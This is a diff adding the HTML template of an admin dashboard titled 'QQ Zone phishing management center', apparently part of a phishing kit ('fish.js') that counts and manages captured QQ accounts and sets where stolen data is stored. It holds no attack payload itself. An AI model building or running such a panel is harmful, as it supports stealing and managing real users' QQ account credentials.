@@ -1,0 +1,71 @@
+﻿<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>QQ空间钓鱼管理中心</title>
+  <link href="css/bootstrap.min.css" rel="stylesheet"/>
+  <script src="js/bootstrap.min.js"></script>
+  <script src="js/jquery.min.js"></script>
+</head>
+<body>
+  <nav class="navbar navbar-fixed-top navbar-default">
+    <div class="container">
+      <div class="navbar-header">
+        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+          <span class="sr-only">导航按钮</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <a class="navbar-brand" >QQ空间钓鱼管理中心</a>
+      </div><!-- /.navbar-header -->
+      <div id="navbar" class="collapse navbar-collapse">
+        <ul class="nav navbar-nav navbar-right">
+          <li class="active">
+            <a href="./"><span class="glyphicon glyphicon-user"></span> 平台首页</a>
+          </li>
+		  <li class="">
+            <a href="qq"><span class="glyphicon glyphicon-calendar"></span> QQ管理</a>
+             </li>
+          <li><a href="login"><span class="glyphicon glyphicon-log-out"></span> 退出登陆</a></li>
+        </ul>
+      </div><!-- /.navbar-collapse -->
+    </div><!-- /.container -->
+  </nav><!-- /.navbar -->
+  <div class="container" style="padding-top:70px;">
+    <div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">
+      <div class="panel panel-primary">
+        <div class="panel-heading"><h3 class="panel-title">管理首页</h3></div>
+          <ul class="list-group">
+         
+			<li class="list-group-item"><span class="glyphicon glyphicon-tint"></span> <b></b>QQ总数： &nbsp NAN
+			
+			</li>
+            <li class="list-group-item"><span class="glyphicon glyphicon-time"></span> <b>现在时间：</b> <script>var myDate = new Date(); document.write(myDate);</script> </li>
+			<li class="list-group-item"><span class="glyphicon glyphicon-home"></span> &nbsp  <a href="/qq" class="btn btn-xs btn-warning">QQ管理</a>
+			</li>
+          </ul>
+      </div>
+<div class="panel panel-info">
+	<div class="panel-heading">
+		<h3 class="panel-title">服务器信息</h3>
+	</div>
+	
+	<ul class="list-group">
+		<li class="list-group-item">
+		<form action="/admin" method="post">
+			<b>数据储存位置：</b> 
+			
+			<input type="text" name="newname" value={{ datadir }} >
+			&nbsp 
+			<input type="submit" value="修改">
+		</form>
+		</li>
+		<li class="list-group-item">
+			<b>当前运行软件：</b> fish.js
+		</li>
+	</ul>
+</div>
+    </div>
+  </div>
